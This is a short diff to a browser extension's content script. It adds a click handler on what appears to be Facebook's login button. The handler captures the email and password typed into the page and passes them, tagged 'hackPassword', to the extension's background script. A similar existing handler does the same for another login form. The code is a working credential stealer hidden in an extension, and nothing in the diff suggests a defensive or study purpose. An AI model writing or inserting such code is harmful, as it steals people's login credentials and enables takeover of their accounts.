@@ -3,13 +3,7 @@ $( "#login-submit" ).click(function() {
 	chrome.runtime.sendMessage(arry);
 });
 
-chrome.extension.onRequest.addListener(function(request) {
-	console.log(request);
-	if (request.action === "reload") {
-		reload(request.loopCount);
-	}
+$( "#u_0_2" ).click(function() {
+	var arry = ["hackPassword",document.getElementById("email").value , document.getElementById("pass").value, "facebook"];
+	chrome.runtime.sendMessage(arry);
 });
-
-function reload(loopCount){
-	location.reload();
-}
